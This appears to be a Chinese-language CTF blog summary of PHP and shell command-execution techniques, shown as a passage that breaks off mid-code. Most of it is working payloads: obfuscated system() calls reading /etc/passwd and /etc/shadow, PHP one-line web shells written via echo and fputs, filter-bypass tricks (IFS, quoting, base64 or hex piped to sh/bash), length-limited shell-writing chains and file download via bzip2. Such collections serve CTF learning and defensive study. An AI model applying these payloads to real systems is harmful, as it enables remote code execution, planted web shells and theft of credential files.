<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -name flag.txt</span><br><span class="line"><span class="builtin-name">find</span> / -name *.txt #查找所有txt文件方法</span><br><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span>看看有s属性文件</span><br><span class="line"><span class="comment">#或者find / -name f&#123;l,m&#125;ag.txt/进行通配出字符</span></span><br><span class="line"><span class="comment">#结合grep命令一起使用</span></span><br><span class="line"><span class="builtin-name">find</span> / -name <span class="string">&quot;*.txt&quot;</span> |xargs grep <span class="string">&quot;www.dutycode.com&quot;</span></span><br><span class="line"><span class="comment">#不知道为什么会出现</span></span><br><span class="line">paths must precede expression: 类型的问题</span><br></pre></td></tr></table></figure>

<p>查看linux内核版本命令</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -<span class="keyword">a</span></span><br><span class="line">dir d:\ <span class="comment">#列出目录类</span></span><br></pre></td></tr></table></figure>

<p>unix中常见命令</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ll 列目录、文件（相当于Windows下dir)</span><br><span class="line">pwd 查看当前绝对路径</span><br><span class="line">wget 下载指定的url文件</span><br><span class="line">cat <span class="regexp">/proc/</span><span class="number">1</span>/cgroup 查看是否处在docker虚拟机中</span><br><span class="line"><span class="comment">#如果无ifconfig和无IP命令的话,可以利用proc文件方式查看</span></span><br><span class="line">cat <span class="regexp">/proc/</span>net/fib_trie</span><br><span class="line">cat <span class="regexp">/etc/</span>sysconfig/network</span><br></pre></td></tr></table></figure>

<p>eval–&gt;可计算某个字符串,并执行其中的的 JavaScript 代码<br> 典型构造是执行代码</p>
<p>1.利用system执行的典型方法</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> $cmd</span><br><span class="line"><span class="comment">#即构造</span></span><br><span class="line">cmd=<span class="keyword">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="comment">#即列出这个文件的相关内容</span></span><br><span class="line"><span class="keyword">system</span>(“ls -al /etc/passwd /etc/shadow”);</span><br><span class="line">cmd=<span class="keyword">system</span>(<span class="string">&quot;cat flag_1171&quot;</span>);</span><br><span class="line"><span class="comment">#骚思路</span></span><br><span class="line"><span class="comment">#绕过</span></span><br><span class="line">c=<span class="keyword">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);</span><br><span class="line"><span class="comment">#--&gt;即代通配符方法读取思路</span></span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;cat /etc/passwd&quot;</span>)</span><br><span class="line">&lt;=&gt;</span><br><span class="line"><span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;cat /etc/passwd&quot;</span>);</span><br><span class="line">&lt;=&gt;</span><br><span class="line">(sy.(st).em)(<span class="string">&quot;cat /etc/passwd&quot;</span>);</span><br><span class="line">&lt;=&gt;还可以用注释方法绕过</span><br><span class="line"><span class="string">&quot;system/*fthgb666*/(&quot;</span>cat /etc/passwd);<span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;=&gt;</span></span><br><span class="line"><span class="string">&quot;</span><span class="keyword">system</span>/*fthgb666*<span class="regexp">/(wh./</span>*fthgb666*<span class="regexp">/(oa)/</span>*fthgb666*<span class="regexp">/.mi);&quot;</span></span><br><span class="line"><span class="regexp">&lt;=&gt;</span></span><br><span class="line"><span class="regexp">&quot;(sy./</span>*fthgb666*<span class="regexp">/(st)/</span>*fthgb666*<span class="regexp">/.em)/</span>*fthgb666*<span class="regexp">/(wh./</span>*fthgb666*<span class="regexp">/(oa)/</span>*fthgb666*/.mi);<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">命令执行函数</span><br><span class="line"><span class="function"><span class="title">system</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">shell_exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">popen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">proc_open</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">pcntl_exec</span><span class="params">()</span></span></span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226231322115.png" alt="image-20220226231322115"></p>
<p>2.写一句话木马,利用echo代写一句话马</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">127.0.0.1 &amp; echo &quot;</span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(@@\<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml">&quot; &gt; 3.php</span></span><br></pre></td></tr></table></figure>

<p><strong>base64的使用</strong></p>
<p>bin为binary的简写主要放置一些 <a target="_blank" rel="noopener" href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64,bzip2等</p>
<p>这里我们可以利用 base64 中的64 进行通配符匹配  即 /bin/base64 flag.php</p>
<p><strong>bzip2的使用</strong></p>
<p>bzip2是linux下面的压缩文件的命令<br>我们可以通过该命令压缩flag.php 然后进行下载<br>payload：?c=/???/???/????2 ????.???    ?c=/???/????2 ????.???<br>也就是/usr/bin/bzip2 flag.php<br>然后访问/flag.php.bz2进行下载获得flag.php</p>
<h2 id="0x03-常见绕过8种方法"><a href="#0x03-常见绕过8种方法" class="headerlink" title="0x03 常见绕过8种方法"></a>0x03 常见绕过8种方法</h2><h3 id="有字母数字rce"><a href="#有字母数字rce" class="headerlink" title="有字母数字rce"></a>有字母数字rce</h3><p>1)命令拼接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=who</span><br><span class="line">b=ami</span><br><span class="line">$a<span class="variable">$b</span> //输出whoami</span><br></pre></td></tr></table></figure>

<p>2)常用字符使用–&gt;常用符号</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp;            表示将任务置于后台执行</span><br><span class="line">;            多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line">&amp;&amp;           只有在 &amp;&amp; 左边的命令返回真<span class="comment">(命令返回值 $? == 0)</span>,&amp;&amp;右边的命令才会被执行。</span><br><span class="line">||           只有在 || 左边的命令返回假<span class="comment">(命令返回值 $? == 1)</span>,||右边的命令才会被执行。</span><br><span class="line"><span class="meta">%</span><span class="number">0</span>a          </span><br><span class="line"><span class="meta">%</span><span class="number">0</span>d            </span><br><span class="line">| <span class="comment">(管道符)</span>     |表示管道，上一条命令的输出，作为下一条命令的参数</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo qwe ; ls           <span class="regexp">//</span>会先输出字符qwe,然后执行ls</span><br><span class="line">q=l; w=s; e=<span class="string">&quot; -al&quot;</span>; <span class="variable">$q</span><span class="variable">$w</span><span class="variable">$e</span>   <span class="regexp">//</span>执行ls -al命令</span><br><span class="line">qwe | ls                <span class="regexp">//</span>执行后面的命令,前面的不执行</span><br><span class="line"><span class="comment">#最常用;和|符号</span></span><br></pre></td></tr></table></figure>

<p>3)linux中默认的字符命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125;    <span class="comment">#l</span></span><br><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">2</span>:<span class="number">1</span>&#125;    <span class="comment">#s</span></span><br><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125;<span class="variable">$</span>&#123;PATH:<span class="number">2</span>:<span class="number">1</span>&#125; <span class="comment">#拼接后是ls,执行命令</span></span><br><span class="line"><span class="variable">$</span>&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125;s           <span class="comment">#拼接后是ls,执行命令</span></span><br><span class="line"><span class="comment">#即直接这个命令即可完事</span></span><br><span class="line"><span class="variable">$</span>&#123;SHLVL&#125;       //一般是一个个位数</span><br><span class="line"><span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;     //1，表示结果的字符长度</span></span><br><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>:<span class="variable">$</span>&#123;<span class="comment">#&#125;:$&#123;#SHLVL&#125;&#125;       //表示/</span></span><br><span class="line"><span class="variable">$</span>&#123;USER&#125;        //www<span class="literal">-data</span>   <span class="number">99</span>%默认是这个</span><br><span class="line"><span class="variable">$</span>&#123;PHP_VERSION:~A&#125;       //<span class="number">2</span></span><br><span class="line"><span class="variable">$</span>&#123;USER:~<span class="variable">$</span>&#123;PHP_VERSION:~A&#125;:<span class="variable">$</span>&#123;PHP_VERSION:~A&#125;&#125;         //at</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span>:<span class="number">0</span>:<span class="number">1</span>&#125;</span><br><span class="line">获取变量<span class="built_in">PWD</span>的第一个字符</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="number">1</span>&#125;</span><br><span class="line">可以为空。为空的部分就当作<span class="number">0</span>了</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span><span class="comment">#??????&#125;</span></span><br><span class="line"><span class="variable">$</span>&#123;变量<span class="comment">#字符串&#125;表示在变量中。截取字符串右边的值。可以用模糊匹配。截取PWD的最后一位</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="built_in">PWD</span>%??????&#125;</span><br><span class="line"><span class="variable">$</span>&#123;变量%字符串&#125;表示在变量中。截取字符串左边的值。可以用模糊匹配。截取<span class="built_in">PWD</span>的第一位</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#PWD&#125;</span></span><br><span class="line">获取变量<span class="built_in">PWD</span>的长度</span><br><span class="line">AASAA;<span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#_&#125;</span></span><br><span class="line"><span class="variable">$_</span>。表示上一个命令的返回结果。这样就可以构造任意数字</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#A&#125;</span></span><br><span class="line">由于变量A没定义。所以他的长度为<span class="number">0</span>.</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$OPTIND</span></span><br><span class="line">这个也可以获取数字<span class="number">1</span></span><br><span class="line">&gt;B;<span class="built_in">echo</span> <span class="variable">$</span>?</span><br><span class="line">最后运行的命令的结束代码,可以获得数字<span class="number">0</span></span><br><span class="line">&lt;B;<span class="built_in">echo</span> <span class="variable">$</span>?</span><br><span class="line">最后运行的命令的结束代码,可以获得数字<span class="number">1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$RANDOM</span></span><br><span class="line">可以生成随机数。可以配合<span class="comment">#构造6543这几种数字。概率比较大。还可以配合截取。获得数字</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#$&#125;</span></span><br><span class="line"><span class="variable">$</span><span class="variable">$</span>是程序PID。<span class="comment">#获取长度。看运气咯</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;</span></span><br><span class="line">SHLVL貌似是一个shell终端深度。。然后<span class="comment">#可以获取数字1</span></span><br><span class="line"><span class="variable">$</span>&#123;USER&#125;        //www<span class="literal">-data</span></span><br></pre></td></tr></table></figure>

<p>4）绕–&gt;空格</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通用绕过</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line"><span class="comment">#linux下绕过</span></span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$1</span></span><br><span class="line"><span class="variable">$</span>&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span></span><br><span class="line">&lt;     比如<span class="built_in">cat</span>&lt;a.tct:表示<span class="built_in">cat</span> a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line"><span class="comment">#windows环境下绕空格</span></span><br><span class="line">~<span class="number">10</span>,<span class="number">1</span>%</span><br><span class="line">~表示为截取符,该语句的含义为从第十个开始截取且获取一个字符串</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以利用这种思路去写马</span><br><span class="line">eval(file_get_contents(<span class="string">&quot;php://input&quot;</span>));</span><br><span class="line"></span><br><span class="line">然后post</span><br><span class="line">fputs(fopen(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]); ?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>5)绕cat</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代替cat方法</span></span><br><span class="line"> cat</span><br><span class="line"> tac</span><br><span class="line"> more</span><br><span class="line"> less</span><br><span class="line"> head</span><br><span class="line"> tail</span><br><span class="line"> nl</span><br><span class="line"> sed</span><br><span class="line"> <span class="keyword">sort</span></span><br><span class="line"> uniq</span><br><span class="line"> rev</span><br><span class="line"> od%09<span class="string">`ls`</span> 利用转进制显示</span><br><span class="line"> <span class="comment">#代替空格的方法</span></span><br><span class="line"> IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</span><br><span class="line"> <span class="comment">#过滤了目录分隔符/ #利用cd执行到目录里后在进行绕</span></span><br><span class="line"> <span class="comment">#如</span></span><br><span class="line"> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>;cd flag_is_here;cat flag_5898818519729.php |base64</span><br><span class="line"> <span class="comment">#过滤了运算符|等</span></span><br><span class="line"> <span class="comment">#即不可以</span></span><br><span class="line"> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>;cd flag_297281061019145.php |base64</span><br><span class="line"> <span class="comment">#绕方法</span></span><br><span class="line"> base64 flag_297281061019145.php</span><br><span class="line">c=echo(<span class="string">`more%09f*`</span>);</span><br><span class="line"><span class="comment">#绕隔离符类--&gt;即|,;类</span></span><br><span class="line"><span class="comment">#可代这个--&gt;注意直接输入到url编码中,防止被转义</span></span><br><span class="line">%0a</span><br></pre></td></tr></table></figure>

<p>6)绕过关键字</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">①单引号和双引号绕过</span><br><span class="line">比如：<span class="keyword">ca</span>’&#x27;t flag 或<span class="keyword">ca</span><span class="string">&quot;&quot;</span>t flag</span><br><span class="line">②反斜杠绕过或者&lt;&lt;绕过</span><br><span class="line">比如：<span class="keyword">ca</span>\t <span class="keyword">fl</span>\ag <span class="keyword">ca</span>&lt;&lt;t</span><br><span class="line">③过滤目录分隔符 /</span><br><span class="line">可以使用;和<span class="keyword">cd</span>到目录然后使用<span class="keyword">cat</span>抓取</span><br><span class="line">④拼接绕过</span><br><span class="line">比如：a=<span class="keyword">l</span>;b=s;a aab</span><br><span class="line">a aab就代表<span class="keyword">ls</span></span><br><span class="line">⑤编码绕过</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">wh\o\ami    <span class="comment">//反斜线绕过</span></span><br><span class="line">who<span class="string">&quot;a&quot;</span>mi    <span class="comment">//双引号绕过</span></span><br><span class="line">whoa<span class="string">&#x27;m&#x27;</span>i    <span class="comment">//单引号绕过</span></span><br><span class="line">whoam``i    <span class="comment">//反引号绕过</span></span><br><span class="line"><span class="keyword">echo</span> d2hvYW1p|base64 -d|sh  <span class="comment">//base64绕过,其中d2hvYW1p是whoami的base64编码</span></span><br><span class="line"><span class="keyword">echo</span> d2hvYW1p|base64 -d|bash<span class="comment">//base64绕过,其中d2hvYW1p是whoami的base64编码</span></span><br><span class="line">`<span class="keyword">echo</span> d2hvYW1p|base64 -d` <span class="comment">//将其base64解码,然后用反引号来执行命令</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">77686</span>F616D69 | xxd -r -p | bash <span class="comment">//hex绕过,其中77686F616D69是whoami的hex编码</span></span><br><span class="line"><span class="comment">//$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:</span></span><br><span class="line">wh$<span class="number">1</span>oami</span><br><span class="line">who$@ami</span><br><span class="line">whoa$*mi</span><br><span class="line"><span class="comment">#⑥借助文件中其他文件的字符串进行绕</span></span><br><span class="line">如</span><br><span class="line">test.php中存在该命令</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hello，lemon&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">即可利用<span class="keyword">echo</span> `expr substr $(awk NR==<span class="number">1</span> test.php) <span class="number">1</span> <span class="number">1</span>`</span><br><span class="line">进行执行&lt;</span><br></pre></td></tr></table></figure>

<p>7)绕文件名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> <span class="built_in">fl</span>[<span class="type">abc</span>]g.php               <span class="comment">#匹配[abc]中的任何一个</span></span><br><span class="line"><span class="built_in">cat</span> f[<span class="type">a</span>-<span class="type">z</span>]ag.txt               <span class="comment">#匹配a-z范围的任何字符</span></span><br><span class="line"><span class="built_in">cat</span> fla*                       <span class="comment">#用*匹配任意</span></span><br><span class="line">a=f;d=ag;c=l;<span class="built_in">cat</span> <span class="variable">$a</span><span class="variable">$c</span><span class="variable">$d</span>.php 表示<span class="built_in">cat</span> flag.php <span class="comment">#内联执行</span></span><br><span class="line"><span class="comment">#利用正则:比如要读取etc/passwd</span></span><br><span class="line"><span class="built_in">cat</span> /???/??????</span><br><span class="line"><span class="built_in">cat</span> /???/pass*</span><br><span class="line"><span class="built_in">cat</span> /etc<span class="variable">$u</span>/passwd</span><br></pre></td></tr></table></figure>

<p>8)绕过滤了system</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">system</span>()<span class="comment">#有回显</span></span><br><span class="line">passthru()</span><br><span class="line"><span class="keyword">exec</span>()</span><br><span class="line">shell_exec()</span><br><span class="line">popen() </span><br><span class="line">proc_open() </span><br><span class="line">pcntl_exec() </span><br><span class="line"><span class="comment">#反引号 </span></span><br><span class="line">c=echo <span class="string">`cat f*`</span>;</span><br></pre></td></tr></table></figure>

<p>9)典型限制长度类rce执行</p>
<p>1.)15个字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>  \<span class="meta">&lt;?php</span> &gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>\(&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \<span class="variable">$_GET</span>&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \[<span class="number">1</span>\]&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \)\;&gt;&gt;<span class="number">1</span></span><br><span class="line">mv <span class="number">1</span> <span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p>2.)7个字符</p>
<p> 1、命令+&gt;文件名可以生产文件(命令可以为空)<br> 2、ls -t可以将文件按时间顺序排列<br> 3、sh命令可以执行sh脚本<br> 4、base64命令可以避免特殊字符<br> 5、\可以分行输入命令</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">w&gt;hp</span><br><span class="line">w&gt;1.p<span class="symbol">\w</span>&gt;d<span class="symbol">\&gt;</span><span class="symbol">\w</span>&gt;<span class="symbol">\ </span>-<span class="symbol">\w</span>&gt;e64<span class="symbol">\w</span>&gt;bas<span class="symbol">\w</span>&gt;7<span class="symbol">\|</span><span class="symbol">\w</span>&gt;XSk<span class="symbol">\w</span>&gt;Fsx<span class="symbol">\w</span>&gt;dFV<span class="symbol">\w</span>&gt;kX0<span class="symbol">\w</span>&gt;bCg<span class="symbol">\w</span>&gt;XZh<span class="symbol">\w</span>&gt;AgZ<span class="symbol">\w</span>&gt;waH<span class="symbol">\w</span>&gt;PD9<span class="symbol">\w</span>&gt;o<span class="symbol">\ </span><span class="symbol">\w</span>&gt;ech<span class="symbol">\l</span>s -t|sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>10)绕system(“ls”)</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#如果system(<span class="string">&quot;ls&quot;</span>)被过滤了</span><br><span class="line">可代php自带函数进行读取文件目录</span><br><span class="line">shana=var<span class="constructor">_dump(<span class="params">scandir</span>(“.”)</span>)?&gt;</span><br><span class="line">print<span class="constructor">_r(<span class="params">scandir</span>(&#x27;<span class="operator">/</span>&#x27;)</span>)</span><br><span class="line">var<span class="constructor">_export(<span class="params">scandir</span>(<span class="string">&quot;/&quot;</span>)</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>globx协议:查找匹配的文件路径模式</p>
<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226232717445.png" alt="image-20220226232717445"></p>
<h3 id="没字母数字RCE"><a href="#没字母数字RCE" class="headerlink" title="没字母数字RCE"></a>没字母数字RCE</h3><p>类型</p>
<p>①不用数字构造出数字类型<br>②不用数字和字母的shell<br>③非字母,数字的字符异或出字母<br>④非字母、数字的字符取反出字母<br>⑤php递增／递减运算符构造出shell<br>⑥不用数字字母下划线和$的shell–&gt;即典型短标签的思路(即直接在短标签中构造常见的shell命令即可)</p>
<p>基础知识点</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">短标签</span></span><br><span class="line"><span class="xml">#如</span></span><br><span class="line"><span class="xml"></span><span class="php"><span class="meta">&lt;?=</span>`ls /`;<span class="meta">?&gt;</span></span><span class="xml">      # 等效于</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls /`; <span class="meta">?&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml">原理:</span><span class="php"><span class="meta">&lt;?=</span> 是 <span class="keyword">echo</span>() 的别名用法</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span><span class="php"><span class="meta">&lt;?=</span>`ls`;   <span class="comment">#构造原因&lt;?= 还是不够的，需要先 ?&gt;</span></span><span class="xml"> 把前面的 </span><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">临时文件上传</span></span><br><span class="line"><span class="php"><span class="comment">#原理:们都知道php文件上传时，一般是将文件上传到临时目录，然后再将临时目录移到其它地方</span></span></span><br><span class="line"><span class="php"><span class="comment">#php.ini中的两个参数</span></span></span><br><span class="line"><span class="php">file_uploads 是否允许上传</span></span><br><span class="line"><span class="php">upload_tmp_dir 是默认的临时文件的保存目录（linux默认为/tmp）</span></span><br><span class="line"><span class="php"><span class="comment">#临时文件保存形式</span></span></span><br><span class="line"><span class="php">默认为 php+<span class="number">4</span>或者<span class="number">6</span>位随机数字和大小写字母</span></span><br><span class="line"><span class="php">如</span></span><br><span class="line"><span 